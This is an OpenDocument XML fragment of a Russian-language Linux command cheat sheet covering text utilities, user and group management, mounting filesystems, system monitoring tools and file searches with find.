      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3"> - выполняет в файле поиск по шаблону. Обязательно требует после себя наличие шаблона. Команда </text:span><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">hello</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">txt</text:span><text:span text:style-name="T3"> найдет в файле </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">txt</text:span><text:span text:style-name="T3"> все строки, в которых присутствует шаблон «</text:span><text:span text:style-name="T2">hello</text:span><text:span text:style-name="T3">», и выведет их на экран. Может использоваться совместно с другими командами.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">sort</text:span><text:span text:style-name="T3"> - сортирует строки текста по различным критериям. По умолчанию утилита сортирует строки по алфавиту. С флагом -</text:span><text:span text:style-name="T2">r</text:span><text:span text:style-name="T3"> команда вида </text:span><text:span text:style-name="T2">sort</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">r</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">txt</text:span><text:span text:style-name="T3"> выполнит сортировку в обратном порядке: от </text:span><text:span text:style-name="T2">Z</text:span><text:span text:style-name="T3"> к </text:span><text:span text:style-name="T2">A</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">wc</text:span><text:span text:style-name="T3"> - утилита для подсчета количества слов, строк, байт и слов в файле. Без флагов команда выводит количества слов, строк и байт. С флагом -</text:span><text:span text:style-name="T2">w</text:span><text:span text:style-name="T3"> показывает количество слов в объекте (строке или файле).</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">diff</text:span><text:span text:style-name="T3"> - показывает различия между двумя файлами в построчном сравнении. Причём выводятся только строки, в которых обнаружены отличия. Измененные строки отмечаются символом «с», удаленные - «</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3">», а новые - «а».</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Пользователи и группы</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">useradd</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">c</text:span><text:span text:style-name="T3"> "</text:span><text:span text:style-name="T2">User</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Vasya</text:span><text:span text:style-name="T3">" -</text:span><text:span text:style-name="T2">g</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">admin</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">bin</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">bash</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> - Создать пользователя </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3">, домашним каталогом будет создана директория /</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3">, в качестве системной оболочки будет назначен /</text:span><text:span text:style-name="T2">bin</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">bash</text:span><text:span text:style-name="T3">, пользователь будет включен в группу </text:span><text:span text:style-name="T2">admin</text:span><text:span text:style-name="T3">, кроме того, для учетной записи будет создан комментарий "</text:span><text:span text:style-name="T2">User</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Vasya</text:span><text:span text:style-name="T3">"</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">useradd</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> - Создать пользователя </text:span><text:span text:style-name="T2">vasya</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">usermod</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">c</text:span><text:span text:style-name="T3"> "</text:span><text:span text:style-name="T2">User</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">FTP</text:span><text:span text:style-name="T3">" -</text:span><text:span text:style-name="T2">g</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">system</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">ftp</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">ftpuser</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">bin</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">nologin</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ftpuser</text:span><text:span text:style-name="T3"> - Изменение пользователя</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">userdel</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">r</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> - Удалить пользователя с именем </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> и его домашнюю директорию</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">groupadd</text:span><text:span text:style-name="T3"> [ </text:span><text:span text:style-name="T2">group</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">name</text:span><text:span text:style-name="T3"> ] - Создать группу с именем </text:span><text:span text:style-name="T2">group</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">name</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chage</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">E</text:span><text:span text:style-name="T3"> 2005-12-31 </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> - Установить дату окончания действия учётной записи пользователя </text:span><text:span text:style-name="T2">vasya</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># groupdel [ group_name ] - Удалить группу group_name</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># groupmod -n test new_test - Переименовать группу test в new_test</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">newgrp</text:span><text:span text:style-name="T3"> - [</text:span><text:span text:style-name="T2">group</text:span><text:span text:style-name="T3">] - Изменяет основную группу текущего пользователя. При указании "-", ситуация будет идентичной той, в которой пользователь вышил из системы и снова вошёл.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Если не указывать группу, основная группа будет назначена из файла /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">passwd</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">grpck</text:span><text:span text:style-name="T3"> - Проверка корректности системных файлов учётных записей. Проверяется файл/</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">group</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">pwck</text:span><text:span text:style-name="T3"> - Проверка корректности системных файлов учётных записей. Проверяются файлы /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">passwd</text:span><text:span text:style-name="T3"> и /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">shadow</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">passwd</text:span><text:span text:style-name="T3"> - Изменить пароль текущего пользователя</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">passwd</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> - Изменить пароль пользователя </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> (может выполнять только </text:span><text:span text:style-name="T2">root</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P1">Монтирование файловых систем</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mount</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">hda</text:span><text:span text:style-name="T3">1 /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3"> - Монтировать устройство /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">hda</text:span><text:span text:style-name="T3">1 в папку с именем /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">. точка монтирования, папка /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3">, должна существовать</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">fuser</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">km</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">hda</text:span><text:span text:style-name="T3">1 - Размонтировать устройство </text:span><text:span text:style-name="T2">hda</text:span><text:span text:style-name="T3">1 если оно заблокировано каким либо процессом</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mount</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">o</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">loop</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">iso</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">cdrom</text:span><text:span text:style-name="T3"> - Смонтировать фаил или образ </text:span><text:span text:style-name="T2">ISO</text:span><text:span text:style-name="T3"> в директорию /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">cdrom</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># mount /dev/hdb /mnt/cdrecorder - Монтировать cdrw или dvdrom</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mount</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vfat</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">hda</text:span><text:span text:style-name="T3">5 /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">hda</text:span><text:span text:style-name="T3">5 - Смонтировать раздел с файловой системой </text:span><text:span text:style-name="T2">FAT</text:span><text:span text:style-name="T3">32</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mount</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">cdrom</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">cdrom</text:span><text:span text:style-name="T3"> - Монтировать </text:span><text:span text:style-name="T2">cdrom</text:span><text:span text:style-name="T3"> или </text:span><text:span text:style-name="T2">dvdrom</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mount</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">fd</text:span><text:span text:style-name="T3">0 /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">floppy</text:span><text:span text:style-name="T3"> - Монтировать </text:span><text:span text:style-name="T2">floppy</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">disk</text:span><text:span text:style-name="T3"> ( дисковод мягких дисков )</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mount</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">hdc</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">cdrecorder</text:span><text:span text:style-name="T3"> - Монтировать </text:span><text:span text:style-name="T2">cdrw</text:span><text:span text:style-name="T3"> или </text:span><text:span text:style-name="T2">dvdrom</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mount</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sda</text:span><text:span text:style-name="T3">1 /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">usbdisk</text:span><text:span text:style-name="T3"> - Монтировать </text:span><text:span text:style-name="T2">USB</text:span><text:span text:style-name="T3"> устройство</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mount</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">smbfs</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">o</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">username</text:span><text:span text:style-name="T3">=</text:span><text:span text:style-name="T2">user</text:span><text:span text:style-name="T3">,</text:span><text:span text:style-name="T2">password</text:span><text:span text:style-name="T3">=</text:span><text:span text:style-name="T2">pass</text:span><text:span text:style-name="T3"> //</text:span><text:span text:style-name="T2">WinClient</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">share</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">share</text:span><text:span text:style-name="T3"> - Монтировать сетевую файловую систему </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">SMB</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">CIFS</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">umount</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">hda</text:span><text:span text:style-name="T3">2 - Размонтировать без записи в файл /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">mtab</text:span><text:span text:style-name="T3">, используется в ситуациях, когда файл находится в режиме только чтение или жесткий диск переполнен</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">umount</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">hda</text:span><text:span text:style-name="T3">2 - Размонтировать диск </text:span><text:span text:style-name="T2">hda</text:span><text:span text:style-name="T3">2, предварительно неоходимо выйти из точки монтирования /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">hda</text:span><text:span text:style-name="T3">2</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Мониторинг в ОС Linux \ ps \ top \ gstat \ vmstat \ iostat \ netstat </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">apt-get install top</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">apt-get install ganglia-monitor</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">apt-get install sysstat</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">apt-get install sockstat</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">У утилиты </text:span><text:span text:style-name="T2">top</text:span><text:span text:style-name="T3"> есть параметры, которые облегают жизнь, их мы набираем в </text:span><text:span text:style-name="T2">top</text:span><text:span text:style-name="T3">’</text:span><text:span text:style-name="T2">e</text:span><text:span text:style-name="T3"> когда он запущен:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">S</text:span><text:span text:style-name="T3"> - показать системные процессы, по умолчанию они не показываются</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">u</text:span><text:span text:style-name="T3"> - и имя пользователя, например </text:span><text:span text:style-name="T2">u</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">mysql</text:span><text:span text:style-name="T3"> покажет процессы запущенные от пользователя </text:span><text:span text:style-name="T2">mysql</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">o</text:span><text:span text:style-name="T3"> - используем для сортировки, возможные параметры - </text:span><text:span text:style-name="T2">pri</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">size</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">res</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">cpu</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">time</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">threads</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">m</text:span><text:span text:style-name="T3"> - переключение между режимами отображения нагрузки и ввода-вывода</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">k</text:span><text:span text:style-name="T3"> - завершить процесс, ввод </text:span><text:span text:style-name="T2">pid</text:span><text:span text:style-name="T3"> процесса</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">r</text:span><text:span text:style-name="T3"> - изменить приоритет процесса, вводим </text:span><text:span text:style-name="T2">pid</text:span><text:span text:style-name="T3"> процесса</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> - отображать статистику по определённому процесс</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> - показывает абсолютные запущенных процессов</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">top</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> 3 - показывает самые ресурсоёмкие приложения в данный момент</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">gstat</text:span><text:span text:style-name="T3"> - показывает использование дисков.</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">gstat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> - используется для вывода только активных устройств</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">vmstat</text:span><text:span text:style-name="T3"> - показывает состояние виртуальной памяти и буфера</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">vmstat</text:span><text:span text:style-name="T3"> 5 - отображает статистику раз в пять секунд</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">vmstat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">z</text:span><text:span text:style-name="T3"> - показывает состояние буфера</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">vmstat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">i</text:span><text:span text:style-name="T3"> - показывает состояние прерываний</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">iostat</text:span><text:span text:style-name="T3"> - выводит статистику по </text:span><text:span text:style-name="T2">I</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">O</text:span><text:span text:style-name="T3"> устройств</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">iostat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">w</text:span><text:span text:style-name="T3">5 - показывать информацию по дискам, с периодичностью в пять секунд безостановочно</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">iostat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">dx</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">w</text:span><text:span text:style-name="T3">5 - показывает расширенную статистику</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">iostat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">dx</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">vda</text:span><text:span text:style-name="T3"> 5 - показывает расширенную статистику</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">netstat</text:span><text:span text:style-name="T3"> - показывает активные сетевые соединения.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">netstat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">w</text:span><text:span text:style-name="T3"> 1 - количество пакетов в настоящее время.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">netstat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">ibt</text:span><text:span text:style-name="T3"> - вывод сетевых интерфейсов с разбивкой по </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3"> адресам, отображает объём трафика, количество ошибок, коллизий</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">netstat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">rn</text:span><text:span text:style-name="T3"> - отображает таблицу маршрутизации</text:span></text:p>
      <text:p text:style-name="P1">Поиск нужного файла</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">find</text:span><text:span text:style-name="T3"> / -</text:span><text:span text:style-name="T2">user</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3"> - Найти все директории и файлы, принадлежащие пользователю </text:span><text:span text:style-name="T2">vasya</text:span><text:span text:style-name="T3">. Поиск будет производиться, начиная с корневой директории (/)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">find</text:span><text:span text:style-name="T3"> / -</text:span><text:span text:style-name="T2">name</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">filedir</text:span><text:span text:style-name="T3"> - Найти директории и файлы с именем </text:span><text:span text:style-name="T2">filedir</text:span><text:span text:style-name="T3">. Поиск будет производиться, начиная с корневой директории (/)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">find</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">usr</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">bin</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">type</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">f</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">atime</text:span><text:span text:style-name="T3"> +20 - Найти все файлы в директории /</text:span><text:span text:style-name="T2">usr</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">bin</text:span><text:span text:style-name="T3">, время последнего обращения к которым более 20 дней</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">find</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">usr</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">bin</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">type</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">f</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">mtime</text:span><text:span text:style-name="T3"> -10 - Найти все файлы в директории /</text:span><text:span text:style-name="T2">usr</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">bin</text:span><text:span text:style-name="T3">, которые были созданы или модифицированы в течении последних 10 дней</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">find</text:span><text:span text:style-name="T3"> / -</text:span><text:span text:style-name="T2">xdev</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">name</text:span><text:span text:style-name="T3"> \*.</text:span><text:span text:style-name="T2">rpm</text:span><text:span text:style-name="T3"> - Искать директории и файлы, имена которых оканчиваются на ".</text:span><text:span text:style-name="T2">rpm</text:span><text:span text:style-name="T3">", но игнорируя съёмные накопители, </text:span><text:span text:style-name="T2">cdrom</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">usb</text:span><text:span text:style-name="T3"> и т. п.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">find</text:span><text:span text:style-name="T3"> . -</text:span><text:span text:style-name="T2">maxdepth</text:span><text:span text:style-name="T3"> 1 -</text:span><text:span text:style-name="T2">name</text:span><text:span text:style-name="T3"> *.</text:span><text:span text:style-name="T2">jpg</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">print</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">exec</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">convert</text:span><text:span text:style-name="T3"> - Найти в текущей директории все файлы с расширением </text:span><text:span text:style-name="T2">jpg</text:span><text:span text:style-name="T3"> и выполнить для каждого команду </text:span><text:span text:style-name="T2">convert</text:span><text:span text:style-name="T3"> ( </text:span><text:span text:style-name="T2">Imagemagick</text:span><text:span text:style-name="T3"> )</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">find</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">path</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">to</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">name</text:span><text:span text:style-name="T3"> \*.</text:span><text:span text:style-name="T2">c</text:span><text:span text:style-name="T3"> - Найти все директории и файлы, имена которых оканчиваются на ".с". Поиск будет производиться, начиная с директории /</text:span><text:span text:style-name="T2">path</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">to</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">dir</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">find</text:span><text:span text:style-name="T3"> / -</text:span><text:span text:style-name="T2">name</text:span><text:span text:style-name="T3"> *.</text:span><text:span text:style-name="T2">rpm</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">exec</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">chmod</text:span><text:span text:style-name="T3"> 755 '{}' \; - Начиная с корня, найти все фалы и директории, имена которых оканчиваются на ".</text:span><text:span text:style-name="T2">rpm</text:span><text:span text:style-name="T3">", и для каждого изменить права доступа</text:span></text:p>
